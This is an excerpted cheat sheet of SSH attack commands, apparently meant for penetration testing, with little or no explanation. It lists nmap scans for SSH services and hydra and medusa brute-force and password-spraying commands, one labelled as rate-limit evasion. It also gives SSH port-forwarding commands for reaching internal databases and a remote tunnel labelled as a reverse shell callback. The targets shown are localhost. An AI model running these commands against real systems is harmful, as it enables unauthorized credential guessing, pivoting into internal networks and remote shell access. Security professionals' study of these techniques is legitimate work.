...
nmap -p 22,2222,22222,2200 127.0.0.1

# Full port scan for SSH
nmap -p- --open 127.0.0.1 | grep -i ssh
...
nmap -sV -p 22 --script ssh-hostkey 127.0.0.1
...
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 127.0.0.1
```
...
hydra -L users.txt -p Password123 ssh://127.0.0.1

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://127.0.0.1

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://127.0.0.1

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://127.0.0.1

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://127.0.0.1

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://127.0.0.1
```
...
```bash
# Basic brute-force
medusa -h 127.0.0.1 -u admin -P passwords.txt -M ssh
...
# Specific port
medusa -h 127.0.0.1 -u admin -P passwords.txt -M ssh -n 2222
```
...
hydra -L users.txt -p Summer2024! ssh://127.0.0.1

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://127.0.0.1
done
```
...
ssh -i id_rsa user@127.0.0.1

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@127.0.0.1
...
ssh -L 8080:127.0.0.1:80 user@127.0.0.1
# Now access http://localhost:8080

# Access internal database
ssh -L 3306:127.0.0.1:3306 user@127.0.0.1

# Multiple forwards
ssh -L 8080:127.0.0.1:80 -L 3306:127.0.0.1:3306 user@127.0.0.1
```
...
ssh -R 8080:localhost:80 user@127.0.0.1
# Remote can access via localhost:8080

# Reverse shell callback
ssh -R 4444:localhost:4444 user@127.0.0.1
```
